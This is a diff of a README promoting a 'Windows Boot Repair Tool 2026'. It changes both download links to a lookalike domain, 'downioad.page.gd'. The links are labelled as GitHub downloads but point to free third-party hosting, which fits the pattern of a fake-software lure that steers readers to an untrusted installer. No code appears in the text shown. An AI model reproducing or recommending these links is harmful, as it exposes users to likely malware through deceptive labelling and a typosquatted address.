@@ -2,7 +2,7 @@
 
 The Windows Boot Repair Tool 2026 is a specialized software designed to address boot-related issues on Windows 10 and Windows 11 operating systems. It helps users recover from boot failures, repair damaged boot sectors, and restore system startup functionality with ease. Whether you're facing a black screen, error messages, or inaccessible system, this tool provides a reliable solution.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -75,7 +75,7 @@ A: The Windows Boot Repair Tool 2026 is available as a free utility for personal
 
 For the latest version of the Windows Boot Repair Tool 2026, please visit the download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 **Last Updated**: October 2026  
 **Version**: 2.1.0  
